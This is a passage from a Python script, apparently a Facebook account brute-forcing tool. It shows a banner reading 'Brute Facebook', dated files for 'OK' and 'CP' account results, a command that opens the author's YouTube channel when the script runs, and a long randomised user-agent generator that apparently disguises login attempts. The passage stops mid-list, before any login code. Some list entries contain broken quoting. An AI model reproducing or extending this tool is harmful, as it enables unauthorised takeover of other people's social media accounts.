"""
    @ open source by ---( Younis john )---
    @ Github : https://github.com/younis-dgk
    @ facebook : https://www.facebook.com/YounisDgk
    
"""
import os
import re
import bs4
import sys
import json
import rich
import time
import random
import datetime
import requests
sys.stdout.write('\x1b]2; ⏤͟͟͞͞ ⍣⃝😈🆈🄾🆄🄽🅸🅂⍣⃝😈 ͟͞⏤ \x07')
os.system('xdg-open https://www.youtube.com/@YounisXyz')
from concurrent.futures import ThreadPoolExecutor as Trd
from time import sleep, strftime
from rich.console import Console
from rich.columns import Columns
from rich import print as Cetak
from rich.tree import Tree
from rich.panel import Panel
from random import choice as rc
from random import randint as rr
from random import randrange as rg
from rich.progress import Progress
from rich.progress import SpinnerColumn
from rich.progress import TextColumn
from rich.progress import BarColumn
from rich.progress import TimeElapsedColumn
(
	ok,
	cp,
	loop,
	id,
	id2,
	pwp,
	pwt
)   =   (
	0,
	0,
	0,
	[],
	[],
	[],
	[]
	)
(
	P,
	M,
	K,
	B,
	H,
	N
)   =   (
	'\x1b[1;97m',
	'\x1b[1;91m',
	'\x1b[1;93m',
	'\x1b[1;94m',
	'\x1b[1;92m',
	'\x1b[0m'
)

now = datetime.datetime.now(
	)
if    3 <= now.hour < 12: 
	sapa = "Pagi"
elif 12 <= now.hour < 15: 
	sapa = "Siang"
elif 15 <= now.hour < 18: 
	sapa = "Sore"
else:
	sapa = "Malam"
dta = {
	'1':'Jan',
	'2':'Feb',
	'3':'Mar',
	'4':'Apr',
	'5':'Mei',
	'6':'Jun',
	'7':'Jul',
	'8':'Agu',
	'9':'Sepr',
	'10':'Okt',
	'11':'Nov',
	'12':'Des'
	}
dtb = {
	'1':'Januari',
	'2':'Februari',
	'3':'Maret',
	'4':'April',
	'5':'Mei',
	'6':'Juni',
	'7':'Juli',
	'8':'Agustus',
	'9':'September',
	'10':'Oktober',
	'11':'November',
	'12':'Desember'
	}
dth = {
	'Monday':'Senin',
	'Tuesday':'Selasa',
	'Wednesday':'Rabu',
	'Thursday':'Kamis',
	'Friday':'Jumat',
	'Saturday':'Sabtu',
	'Sunday':'Minggu'
	}
tgl = now.day
mon = dta[
	(
		str(
			now.month
		)
	)
]
bln = dtb[
	(
		str(
			now.month
		)
	)
]
thn = now.year
day = dth[
	(
		str(
			strftime(
				"%A"
			)
		)
	)
]
jam = now.strftime(
	"%I"
	)
mnt = now.strftime(
	"%M"
	)
dtk = now.strftime(
	"%S"
	)
wkt = (
		'%s,%s-%s-%s,%s:%s:%s,%s'
		%
		(
		day,
		tgl,
		bln,
		thn,
		jam,
		mnt,
		dtk,
		sapa
		)
	)
okc = (
	'OK-'
	+
	str(tgl)
	+
	'-'
	+
	str(mon)
	+
	'-'
	+
	str(thn)
	+
	'.txt'
	)
cpc = (
	'CP-'
	+
	str(tgl)
	+
	'-'
	+
	str(mon)
	+
	'-'
	+
	str(thn)
	+
	'.txt'
	)
def Bersih():
	os.system(
		"cls"
		if os.name == "nt"
		else "clear"
	)
def Back_Menu():
	Main_Menu(
	)
def Banner():
	Bersih(
	)
	Console(width=48).print(
		Panel(
			'''[bold #0000CD] ⠀⠀⠀⠀⠀⠀⢁⣴⣶⣶⣤⣀⠀⠀⠀⠉⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠒⣠⣶⣶⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⢀⡜⣽⣃⣿⣿⣿⣿⣿⣦⡀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⠈⢻⣦⠀⠠⡀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⣰⠋⣰⠇⣸⡟⠙⢻⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⠀⢀⣿⣷⡀⠘⢆⠀⠀⠀⠀\n⠀ ⠀⣰⠃⣴⡏⢀⣿⠁⠀⠀⠙⢿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡿⠋⢸⡇⠀⣿⣿⣷⡀⠀⠳⡀⠀⠀\n ⠀⢠⠏⣴⡿⠀⣾⡏⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣷⣤⣤⣤⣤⣾⣿⣿⣿⠋⠀⠀⠈⣇⠀⠘⣿⣿⣷⡀⠀⠹⡄⠀\n ⠀⣿⠏⢸⣗⣼⡿⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣻⣷⣄⠀⠀⠀⢹⡀⠀⠻⣿⣿⣷⡀⠀⠸⡀\n ⢸⠇⣶⣾⣿⣿⠃⠀⠀⠀⠀⠀⣤⣼⣟⢋⡬⣽⡟⣟⡛⢿⢿⡛⠻⡿⠿⣿⣦⠀⠀⠈⣧⠀⠀⢻⣿⣿⣿⡄⠀⢇\n ⣿⣶⣾⣿⣿⠃⠀⠀⠀⠀⢀⣞⡟⣯⣴⣾⣿⠃⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠸⣇⠀⢉⣽⣿⣿⣿⡄⠈\n ⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⡼⣞⣾⢿⣿⣿⡏⠀⣿⣿⡏⣿⣿⢻⣿⣿⣿⣿⣿⣿⡇⠀⢀⡙⣆⠀⠠⣾⣿⣿⣷⠀\n ⠹⠿⠿⠋⠀⠀⠀⠀⠀⢰⡿⣹⡏⡿⣽⡿⠀⠀⠈⣟⣯⢿⣿⠀⠛⠿⣿⣿⣿⣿⣿⡀⠀⠀⠘⢷⣄⣨⣿⣿⠟⠀\n ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠃⣿⣿⣇⣿⣡⣴⣶⠐⠭⣿⡇⡟⣿⣿⠟⢾⡏⢿⣿⣿⣿⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀\n ⠂⠀⠀⠀⠀⠀⠀⠀⠀⢿⠀⡿⣿⣿⣿⠁⠛⠛⠀⠟⠿⣹⠁⠀⠁⢠⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⣿⣿⣿⣏⠀⠀⠀⠀⠀⠇⠀⠀⠀⣣⢿⣯⢾⣿⡿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢠⢿⣿⣿⣾⡀⠀⠀⠈⠉⠀⠀⠀⠀⣠⡿⣿⣾⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣾⠘⣿⣿⣿⣦⣄⣀⠀⠀⣀⡴⠞⣿⣁⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣬⣿⣿⣿⣿⣿⣿⡛⠋⠁⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⣿⣿⣿⠿⢿⢿⢻⣅⠈⠳⠤⣀⡀⠾⣿⡛⣿⣟⡿⠿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣇⡟⠉⠀⠀⠈⢿⣾⣧⣷⡀⢰⣾⣽⣷⣿⣿⠟⣿⡏⠁⠈⢻⣷⢣⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣯⣿⠁⠀⠀⠀⠀⠈⢹⡿⣏⡌⠄⢻⡏⠀⠏⠋⠀⠞⣫⡃⠀⠈⣿⣯⢇⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⠀⠀⠀⠀⠀⢠⡀⢊⡾⠆⠄⠂⠀⠀⠀⠀⠀⠀⡳⡡⢧⡀⣿⣿⣾⡄⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⣰⡿⣿⣿⠀⠀⠀⠀⠀⢰⠁⠀⢺⣲⡓⡀ ⠀⠀⢄⠀⠀⠕⣖⡇⢈⣼⣿⡜⣷⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⣿⡇⣿⣿⡀⠀⠀⠀⠀⠘⠀⢀⡼⣿⡿⢭⡂⠀⠀ ⠳⡀⠁⣸⣿⣋⠈⣿⣿⠹⡇⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⢸⡿⣿⣿⠻⡇⠀⠀⠀⠀⠀⠀⣼⠀⢛⣧⠅⡏⠳⣦ ⡀⢃⣰⣟⠻⡆⠀⣼⣿⣧⣷⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⢸⠃⢻⡏⢸⣷⠀⠀⠀⠀⠀⣸⡇⠀⠀⠻⢿⡅⠀⣶⣿⣶⣴⣿⣤⣽⣾⣾⣿⣿⡟⣿⡀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠘⡆⠸⣧⣼⢹⡆⠀⠀⠀⠀⣿⣿⣦⣤⣸⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢹⡇⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠰⠃⠀⢻⡏⣼⣷⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⡇⠘⡇⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠂⠀⠀⢰⣿⣿⣿⣇⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢠⡿⣧⣿⣹⡇⠀⡇⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⣰⣯⡾⢣⣿⣿⡀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⢸⡇⣿⠇⣿⠁⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⢀⣠⠾⠛⠁⢠⡿⡿⣿⠇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠈⡇⠋⠀⡯⣀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠈⡆⠀⠀⠔⠋⣼⣿⣿⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⡇⠀⠀⠀⠀⠁⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠁⢀⣠⡴⣻⣿⣿⣿⡆⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⡿⠁⡇⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⣠⠖⠋⠉⠉⠙⢿⣿⣿⡇⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡿⠁⠀⢰⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⡤⠊⠀⠀⠀⠠⠀ ⠀⠈⢻⣿⣿⠀⠀⠀⠸⣿⣿⣿⣿⣟⣾⠷⣄⠀⢸⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀\n ⠀⡠⠊⡀⠀⠀⠠⠈⠀⠀ ⠀⠀⠈⣿⣿⡆⠀⠀⠀⣿⣿⣿⣿⠟⠁⠀⠙⡆⠀⡇⠀⠠⠁⠀         \n[bold purple]╭──────────────────────────────────────────╮\n│[bold #00FF7F]  Brute Facebook [bold purple]│\n╰──────────────────────────────────────────╯''',
			width=48,
			title="[bold #545B5B][ [bold #FF0000]● [bold #FFFF00]● [bold #00FF00]●[bold #545B5B] ]",
			title_align="left",
			subtitle=f"[bold #FF00D4]* <[bold purple][underline]{wkt}[bold #FF00D4][/underline]> *",
			style=f"bold purple",
		)
	)
def UserAgent():
    versi_iphone = str(rc([
        '9_3_5',
        '10_3_3',
        '15_4',
        '14_3',
        '13_5',
        '14_5',
        '13_4',
        '17_2_1',
        '12_3_1',
        '17_3',
        '17_2',
        '14_2_1',
        '16_6',
        '13_2_1',
        '14_4_2',
        '12_5_7',
        '9_3_5',
        '11_0_3',
        '11_2_1',
        '9_1',
        '10_2_1',
        '8_3',
        '8_1_2',
        '11_2_6',
        '10_3_2',
        '10_3_1',
        '10_3_3',
        '11_3',
        '10_1_1',
        '11_3_1',
        '11_0_2',
        '10_3_3',
        '10_1_1',
        '10_2_2',
        '9_3_5',
        '11_2_6']))
    mobile_iphone = str(rc([
        '13A404',
        '13A344',
        '13A4325c',
        '13A452',
        '13D15',
        '13C75',
        '13B143',
        '13C75',
        '12F69',
        '12A365',
        '12A405',
        '12B410',
        '12B470',
        '12B36',
        '12B440',
        '11B554a',
        '11B651',
        '11D167',
        '11D201',
        '15E148',
        '10A5397e',
        '10A5388e',
        'Y6MLQN',
        '8G7LN3',
        '2783VM',
        'X35XFL',
        'W5T30Y']))
    merek_device = str(rc([
        'Linux',
        'X11',
        'Macintosh',
        'iPhone',
        'iPad',
        'Android',
        'SmartTV',
        'BlackBerry',
        'SpreadTrum',
        'MAUI Runtime',
        'J2ME/MIDP',
        'Series 60',
        'MTK',
        'iOS',
        'Windows Mobile',
        'Bada',
        'BREW',
        'Tizen']))
    tipe_kamu = str(rc([
        'en-IE',
        'ja-JP',
        'pt-BR',
        'de-DE',
        'pl-PL',
        'pt-PT',
        'ru-RU',
        'cs-CZ',
        'de-DE',
        'it-IT',
        'es-BR',
        'tr-TR',
        'pl-PL']))
    build = str(rc([
        'MRA58K',
        'JOP24G',
        'NRD90M',
        'O11019',
        'LMY47I',
        'O00623']))
    tipe_oppo = str(rc([
        'CPH1869',
        'CPH1929',
        'CPH2107',
        'CPH2238',
        'CPH2389',
        'CPH2401',
        'CPH2407',
        'CPH2413',
        'CPH2415',
        'CPH2417',
        'CPH2419',
        'CPH2455',
        'CPH2459',
        'CPH2461',
        'CPH2471',
        'CPH2473',
        'CPH2477',
        'CPH8893',
        'CPH2321',
        'CPH2341',
        'CPH2373',
        'CPH2083',
        'CPH2071',
        'CPH2077',
        'CPH2185',
        'CPH2179',
        'CPH2269',
        'CPH2421',
        'CPH2349',
        'CPH2271',
        'CPH1923',
        'CPH1925',
        'CPH1837',
        'CPH2015',
        'CPH2073',
        'CPH2081',
        'CPH2029',
        'CPH2031',
        'CPH2137',
        'CPH1605',
        'CPH1803',
        'CPH1853',
        'CPH1805',
        'CPH1809',
        'CPH1851',
        'CPH1931',
        'CPH1959',
        'CPH1933',
        'CPH1935',
        'CPH1943',
        'CPH2061',
        'CPH2069',
        'CPH2127',
        'CPH2131',
        'CPH2139',
        'CPH2135',
        'CPH2239',
        'CPH2195',
        'CPH2273',
        'CPH2325',
        'CPH2309',
        'CPH1701',
        'CPH2387',
        'CPH1909',
        'CPH1920',
        'CPH1912',
        'CPH1901',
        'CPH1903',
        'CPH1905',
        'CPH1717',
        'CPH1801',
        'CPH2067',
        'CPH2099',
        'CPH2161',
        'CPH2219',
        'CPH2197',
        'CPH2263',
        'CPH2375',
        'CPH2339',
        'CPH1715',
        'CPH2385',
        'CPH1729',
        'CPH1827',
        'CPH1938',
        'CPH1937',
        'CPH1939',
        'CPH1941',
        'CPH2001',
        'CPH2021',
        'CPH2059',
        'CPH2121',
        'CPH2123',
        'CPH2203',
        'CPH2333',
        'CPH2365',
        'CPH1913',
        'CPH1911',
        'CPH1915',
        'CPH1969',
        'CPH2209',
        'CPH1987',
        'CPH2095',
        'CPH2119',
        'CPH2285',
        'CPH2213',
        'CPH2223',
        'CPH2363',
        'CPH1609',
        'CPH1613',
        'CPH1723',
        'CPH1727',
        'CPH1725',
        'CPH1819',
        'CPH1821',
        'CPH1825',
        'CPH1881',
        'CPH1823',
        'CPH1871',
        'CPH1875',
        'CPH2023',
        'CPH2005',
        'CPH2025',
        'CPH2207',
        'CPH2173',
        'CPH2307',
        'CPH2305',
        'CPH2337',
        'CPH1955',
        'CPH1707',
        'CPH1719',
        'CPH1721',
        'CPH1835',
        'CPH1831',
        'CPH1833',
        'CPH1879',
        'CPH1893',
        'CPH1877',
        'CPH1607',
        'CPH1611',
        'CPH1917',
        'CPH1919',
        'CPH1907',
        'CPH1989',
        'CPH1945',
        'CPH1951',
        'CPH2043',
        'CPH2035',
        'CPH2037',
        'CPH2036',
        'CPH2009',
        'CPH2013',
        'CPH2113',
        'CPH2091',
        'CPH2125',
        'CPH2109',
        'CPH2089',
        'CPH2065',
        'CPH2159',
        'CPH2145',
        'CPH2205',
        'CPH2201',
        'CPH2199',
        'CPH2217',
        'CPH1921',
        'CPH2211',
        'CPH2235',
        'CPH2251',
        'CPH2249',
        'CPH2247',
        'CPH2237',
        'CPH2371',
        'CPH2293',
        'CPH2353',
        'CPH2343',
        'CPH2359',
        'CPH2357',
        'CPH2457',
        'CPH1983',
        'CPH1979']))
    seri_cubot = str(rc([
        'MRA58K',
        'JOP24G',
        "NRD90M','O11019",
        'LMY47I',
        'O00623']))
    versi_cubot = str(rc([
        'MAGIC',
        'ARAII SAYANG ARSY',
        'ARAII SAYANG ARSY_P20',
        'ARAII SAYANG ARSY CHEETAH 2',
        'ARAII SAYANG ARSY_NOVA',
        'ARAII SAYANG ARSY NOTE Plus',
        'ARAII SAYANG ARSY J9',
        'ARAII SAYANG ARSY R11',
        'ARAII SAYANG ARSY_MANITO',
        'ARAII SAYANG ARSY KING KONG',
        'ARAII SAYANG ARSY J3 PRO',
        'ARAII SAYANG ARSY_J3',
        'ARAII SAYANG ARSY_NOTE_S',
        'ARAII SAYANG ARSY X18',
        'ARAII SAYANG ARSY R9',
        'ARAII SAYANG ARSY_POWER',
        'ARAII SAYANG ARSY MAX',
        'ARAII SAYANG ARSY_X18_Plus',
        'ARAII SAYANG ARSY H3',
        'ARAII SAYANG ARSY ECHO']))
    tipe_cubot = str(rc([
        'Win64; x64',
        'WOW64',
        'Win32; x86',
        'Trident']))
    seri_viabrowser = str(rc([
        'N4LEFH',
        'TQ2A',
        'QQ1B',
        'PQ1A',
        'SQ3A',
        'RD1B',
        'LDK2WU',
        'SD2A',
        "AB03E'",
        'Z367Q',
        'R8638',
        'C886H']))
    model_android = str(rc([
        'RMX3472',
        'RMX3611',
        'RMX3396',
        'RMX3572',
        'RMX3706',
        'RMX3396',
        'RMX3610',
        'RMX3371',
        'RMX3572',
        'RMX3461',
        'RMX3311',
        'RMX3563',
        'RMX3371',
        'RMX3269',
        'RMX3370',
        'RMX3574',
        'RMX3661',
        'RMX3611']))
    seri_katana = str(rc([
        'SP1A.210812.016',
        'TP1A.220905.001',
        'SP1A.210812.016',
        'SP1A.210812.016',
        'TP1A.220905.001',
        'TP1A.220905.001',
        'SP1A.210812.016',
        'RKQ1.210503.001',
        'TP1A.220905.001',
        'RKQ1.211119.001',
        'TP1A.220905.001',
        'TP1A.220905.001',
        'RP1A.201005.001',
        'RP1A.201005.001',
        'RKQ1.211119.001']))
    versi_iphone = str(rc([
        '9_3_5',
        '10_3_3',
        '15_4',
        '14_3',
        '13_5',
        '14_5',
        '13_4',
        '17_2_1',
        '12_3_1',
        '17_3',
        '17_2',
        '14_2_1',
        '16_6',
        '13_2_1',
        '14_4_2',
        '12_5_7',
        '9_3_5',
        '11_0_3',
        '11_2_1',
        '9_1',
        '10_2_1',
        '8_3',
        '8_1_2',
        '11_2_6',
        '10_3_2',
        '10_3_1',
        '10_3_3',
        '11_3',
        '10_1_1',
        '11_3_1',
        '11_0_2',
        '10_3_3',
        '10_1_1',
        '10_2_2',
        '9_3_5',
        '11_2_6']))
    tipe_iphone = str(rc([
        'Y6MLQN',
        '8G7LN3',
        '2783VM',
        'X35XFL',
        'W5T30Y']))
    tipe_opera = str(rc([
        'ar',
        'pt',
        'es',
        'ja',
        "ru','en",
        'id',
        'de',
        'fr',
        'en',
        'pl',
        'en-us',
        'fa',
        'da',
        'zh',
        'nl',
        'ssr',
        'el',
        'ca',
        'ta',
        'bn',
        'uk',
        'tr',
        'vi',
        'cs',
        'us']))
    merek_opera = str(rc([
        'Macintosh',
        'iPhone',
        'iPad',
        'Android',
        'SmartTV',
        'BlackBerry',
        'SpreadTrum',
        'MAUI Runtime',
        'J2ME/MIDP',
        'Series 60',
        'MTK',
        'iOS',
        'Windows Mobile',
        'Bada',
        'BREW',
        'Tizen']))
    tipe_smbrowser = str(rc([
        'SM-A405FN',
        'SM-A346M',
        'SM-J415FN',
        'SM-X706B',
        'SM-J337R4',
        'SM-A9000',
        'SM-G532G',
        'SM-J810M',
        'SM-T280',
        'Mi 9T Pro',
        'Xiaomi 10 Pro',
        'V2231',
        'SM-M546B',
        '22041219I',
        'SM-N970F',
        'SM-A700K',
        'SM-A700S',
        'KINGKONG 5',
        'SC-05L',
        'SAMSUNG SM-A245M',
        'SM-A202K',
        'SAMSUNG SM-A245F',
        'SAMSUNG SM-A125F',
        'SAMSUNG SM-G950U',
        'SAMSUNG SM-A045F',
        'SAMSUNG SM-G996U',
        'SAMSUNG SM-W2021',
        'Infinix X663C',
        'SC-03K',
        'SAMSUNG SM-A135F',
        'SAMSUNG SM-A127F',
        'SAMSUNG SM-J330F',
        'SAMSUNG SM-A127F/A127FXXS7BVK1',
        'SAMSUNG SM-A127F/A127FXXS8CWB1']))
    tipe_infinix = str(rc([
        'X676B',
        'X687',
        'X609',
        'X697',
        'X680D',
        'X507',
        'X605',
        'X668',
        'X6815B',
        'X624',
        'X655F',
        'X689C',
        'X608',
        'X698',
        'X682B',
        'X682C',
        'X688C',
        'X688B',
        'X658E',
        'X659B',
        'X689B',
        'X689',
        'X689D',
        'X662',
        'X662B',
        'X675',
        'X6812B',
        'X6812',
        'X6817B',
        'X6817',
        'X6816C',
        'X6816',
        'X6816D',
        'X668C',
        'X665B',
        'X665E',
        'X510',
        'X559C',
        'X559F',
        'X559',
        'X606',
        'X606C',
        'X606D',
        'X623',
        'X624B',
        'X625C',
        'X625D',
        'X625B',
        'X650D',
        'X650B',
        'X650',
        'X650C',
        'X655C',
        'X655D',
        'X680B',
        'X573',
        'X573B',
        'X622',
        'X693',
        'X695C',
        'X695D',
        'X695',
        'X663B',
        'X663',
        'X670',
        'X671',
        'X671B',
        'X672',
        'X6819',
        'X572',
        'X572-LTE',
        'X571',
        'X604',
        'X610B',
        'X690',
        'X690B',
        'X656',
        'X692',
        'X683',
        'X450',
        'X5010',
        'X501',
        'X401',
        'X626',
        'X626B',
        'X652',
        'X652A',
        'X652B',
        'X652C',
        'X660B',
        'X660C',
        'X660',
        'X5515',
        'X5515F',
        'X5515I',
        'X609B',
        'X5514D',
        'X5516B',
        'X5516C',
        'X627',
        'X680',
        'X653',
        'X653C',
        'X657',
        'X657B',
        'X657C',
        'X6511B',
        'X6511E',
        'X6511',
        'X6512',
        'X6823C',
        'X612B',
        'X612',
        'X503',
        'X511',
        'X352',
        'X351',
        'X530',
        'X676C',
        'X6821',
        'X6823',
        'X6827',
        'X509',
        'X603',
        'X6815',
        'X620B',
        'X620',
        'X687B',
        'X6811B',
        'X6810',
        'X6811']))
    tipe_redmi = str(rc([
        '2201116SI',
        'M2012K11AI',
        '22011119TI',
        '21091116UI',
        'M2102K1AC',
        'M2012K11I',
        '22041219I',
        '22041216I',
        '2203121C',
        '2106118C',
        '2201123G',
        '2203129G',
        '2201122G',
        '2201122C',
        '2206122SC',
        '22081212C',
        '2112123AG',
        '2112123AC',
        '2109119BC',
        'M2002J9G',
        'M2007J1SC',
        'M2007J17I',
        'M2102J2SC',
        'M2007J3SY',
        'M2007J17G',
        'M2007J3SG',
        'M2011K2G',
        'M2101K9AG ',
        'M2101K9R',
        '2109119DG',
        'M2101K9G',
        '2109119DI',
        'M2012K11G',
        'M2102K1G',
        '21081111RG',
        '2107113SG',
        '21051182G',
        'M2105K81AC',
        'M2105K81C',
        '21061119DG',
        '21121119SG',
        '22011119UY',
        '21061119AG',
        '21061119AL',
        '22041219NY',
        '22041219G',
        '21061119BI',
        '220233L2G',
        '220233L2I',
        '220333QNY',
        '220333QAG',
        'M2004J7AC',
        'M2004J7BC',
        'M2004J19C',
        'M2006C3MII',
        'M2010J19SI',
        'M2006C3LG',
        'M2006C3LVG',
        'M2006C3MG',
        'M2006C3MT',
        'M2006C3MNG',
        'M2006C3LII',
        'M2010J19SL',
        'M2010J19SG',
        'M2010J19SY',
        'M2012K11AC',
        'M2012K10C',
        'M2012K11C',
        '22021211RC']))
    kode_model = str(rc([
        'Andromax A',
        'Andromax A2',
        'Andromax B',
        'Andromax B2',
        'Andromax C',
        'Andromax C2',
        'Andromax C3',
        'Andromax C3si',
        'Andromax C3s',
        'Andromax D',
        'Andromax E',
        'Andromax E2',
        'Andromax R',
        'Andromax Q',
        'Andromax Qi',
        'Andromax N',
        'Andromax N1',
        'Andromax N2',
        'Andromax N3',
        'Andromax N4',
        'Andromax A Prime',
        'Andromax A2 Prime',
        'Andromax B Prime',
        'Andromax C Prime',
        'Andromax R Prime',
        'Andromax Q Prime',
        'Andromax Qi Prime',
        'Andromax N Prime',
        'Andromax N1 Prime',
        'Andromax N2 Prime',
        'Andromax N3 Prime',
        'Andromax N4 Prime',
        'Andromax A Pro',
        'Andromax A2 Pro',
        'Andromax B Pro',
        'Andromax C Pro',
        'Andromax R Pro',
        'Andromax Q Pro',
        'Andromax Qi Pro',
        'Andromax N Pro',
        'Andromax N1 Pro',
        'Andromax N2 Pro',
        'Andromax N3 Pro',
        'Andromax N4 Pro',
        'Andromax A Ultra',
        'Andromax A2 Ultra',
        'Andromax B Ultra',
        'Andromax C Ultra',
        'Andromax R Ultra',
        'Andromax Q Ultra',
        'Andromax Qi Ultra',
        'Andromax N Ultra',
        'Andromax N1 Ultra',
        'Andromax N2 Ultra',
        'Andromax N3 Ultra',
        'Andromax N4 Ultra',
        'Andromax A Max',
        'Andromax A2 Max',
        'Andromax B Max',
        'Andromax C Max',
        'Andromax R Max',
        'Andromax Q Max',
        'Andromax Qi Max',
        'Andromax N Max',
        'Andromax N1 Max',
        'Andromax N2 Max',
        'Andromax N3 Max',
        'Andromax N4 Max',
        'Andromax A Plus',
        'Andromax A2 Plus',
        'Andromax B Plus',
        'Andromax C Plus',
        'Andromax R Plus',
        'Andromax Q Plus',
        'Andromax Qi Plus',
        'Andromax N Plus',
        'Andromax N1 Plus',
        'Andromax N2 Plus',
        'Andromax N3 Plus',
        'Andromax N4 Plus',
        'Andromax A Lite',
        'Andromax A2 Lite',
        'Andromax B Lite',
        'Andromax C Lite',
        'Andromax R Lite',
        'Andromax Q Lite',
        'Andromax Qi Lite',
        'Andromax N Lite',
        'Andromax N1 Lite',
        'Andromax N2 Lite',
        'Andromax N3 Lite',
        'Andromax N4 Lite',
        'Lumia 520',
        'Lumia 620',
        'Lumia 720',
        'Lumia 820',
        'Lumia 920',
        'Lumia 1020',
        'Lumia 1320',
        'Lumia 1520',
        'Lumia 430',
        'Lumia 435',
        'Lumia 530',
        'Lumia 532',
        'Lumia 535',
        'Lumia 540',
        'Lumia 550',
        'Lumia 610',
        'Lumia 650',
        'Lumia 710',
        'Lumia 735',
        'Lumia 800',
        'Lumia 810',
        'Lumia 820',
        'Lumia 822',
        'Lumia 830',
        'Lumia 920',
        'Lumia 925',
        'Lumia 928',
        'Lumia 930',
        'Lumia 950',
        'Lumia 950 XL',
        'Lumia 435 Dual SIM',
        'Lumia 530 Dual SIM',
        'Lumia 532 Dual SIM',
        'Lumia 540 Dual SIM',
        'Lumia 640 Dual SIM',
        'Lumia 640 XL Dual SIM',
        'Lumia 640 XL LTE',
        'Lumia 640 LTE',
        'Lumia 435 LTE',
        'Lumia 532 LTE',
        'Lumia 540 LTE',
        'Lumia 640 LTE Dual SIM',
        'Lumia 650 Dual SIM',
        'Lumia 650 LTE',
        'Lumia 650 XL Dual SIM',
        'Lumia 650 XL LTE',
        'Lumia 550 LTE',
        'Lumia 850 LTE',
        'Lumia 950 Dual SIM',
        'Lumia 950 XL Dual SIM',
        'Lumia 550 Dual SIM',
        'Lumia 750',
        'Lumia 560',
        'Lumia 745',
        'Lumia 670',
        'Lumia 795',
        'Lumia 890',
        'Lumia 910',
        'Lumia 990',
        'Lumia 720 Dual SIM',
        'Lumia 920 Dual SIM',
        'Lumia 925 Dual SIM',
        'Lumia 928 Dual SIM',
        'Lumia 930 Dual SIM',
        'Lumia 950 Dual SIM',
        'Lumia 1250',
        'Lumia 1350',
        'Lumia 1450',
        'Lumia 1550',
        'Lumia 1650',
        'Lumia 1750',
        'Lumia 1850',
        'Lumia 1950',
        'Lumia 2050',
        'Lumia 2150',
        'Lumia 2250',
        'Lumia 2350',
        'Lumia 2450',
        'Lumia 2550',
        'Lumia 2650',
        'Lumia 2750',
        'Lumia 2850',
        'Lumia 2950',
        'Lumia 3050',
        'Lumia 3150',
        'Lumia 3250',
        'Lumia 3350',
        'Lumia 3450',
        'Lumia 3550',
        'Lumia 3650',
        'Lenovo Vibe K5',
        'Lenovo Vibe K5 Plus',
        'Lenovo Vibe K6',
        'Lenovo Vibe K6 Note',
        'Lenovo Vibe K6 Power',
        'Lenovo Vibe K7',
        'Lenovo Vibe K8',
        'Lenovo Vibe K8 Plus',
        'Lenovo Vibe K9',
        'Lenovo Vibe K10',
        'Lenovo Vibe K11',
        'Lenovo Vibe K12',
        'Lenovo Vibe Z5',
        'Lenovo Vibe Z5 Pro',
        'Lenovo Vibe Z6',
